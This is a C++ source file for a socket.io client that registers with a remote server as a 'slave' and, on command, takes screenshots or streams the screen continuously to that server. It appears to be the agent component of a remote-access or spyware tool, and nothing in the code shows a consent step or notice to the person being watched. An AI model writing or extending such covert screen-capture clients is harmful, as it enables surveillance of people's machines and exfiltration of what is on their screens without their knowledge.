#include <Client.h>

namespace silence
{
    Client::Client(const std::string &url)
        : BaseClient(url)
    {
        // bind events
        BaseClient::bindEvent("command",
                              std::bind(&Client::onCommand,
                                        this, std::placeholders::_1,
                                        std::placeholders::_2,
                                        std::placeholders::_3, std::placeholders::_4));
    }

    void Client::onFailed()
    {
        std::cout << "sio failed" << std::endl;
        exit(-1);
    }

    void Client::onClosed(sio::client::close_reason const &reason)
    {
        std::cout << "sio closed" << std::endl;
        exit(0);
    }

    void Client::onCommand(std::string const &name,
                           sio::message::ptr const &data,
                           bool hasAck,
                           sio::message::list &ack_resp)
    {
        auto commandObject = data->get_map();
        std::string command = commandObject["command"]->get_string();

        if (command == "whois")
        {
            std::thread thread(std::bind(&Client::whoisEvent, this));
            thread.detach();
        }
        else if (command == "liveStream")
        {
            std::thread thread(std::bind(&Client::liveStreamEvent, this));
            thread.detach();
        }
        else if (command == "screenshot")
        {
            std::thread thread(std::bind(&Client::screenshotEvent, this));
            thread.detach();
        }
        else
        {
            std::thread thread(std::bind(&Client::unknownEvent, this, std::placeholders::_1), command);
            thread.detach();
        }
    }

    sio::message::list
    Client::createJSObject(const std::map<std::string, sio::message::ptr> &object)
    {
        auto obj = sio::object_message::create();
        obj.get()->get_map() = object;
        return obj;
    }

    void Client::whoisEvent()
    {
        mSock->emit("helloWorld",
                    createJSObject({{"isSlave", sio::bool_message::create(true)}}));
    }

    void Client::screenshotEvent()
    {
        impl::Screenshot screen;
        cv::Mat image{screen.take()};

        mSock->emit("screenFrame",
                    impl::toBinaryString(image));
    }

    void Client::liveStreamEvent()
    {
        impl::Screenshot screen;
        while (true)
        {
            auto imageFuture = std::async(std::launch::async,
                                          std::bind(&impl::Screenshot::take, &screen));
            imageFuture.wait();

            mSock->emit("streamFrame",
                        impl::toBinaryString(imageFuture.get()));
        }
    }

    void Client::unknownEvent(const std::string &event)
    {
        mSock->emit("unknownEvent",
                    createJSObject({{"event", sio::string_message::create(event)}}));
    }
}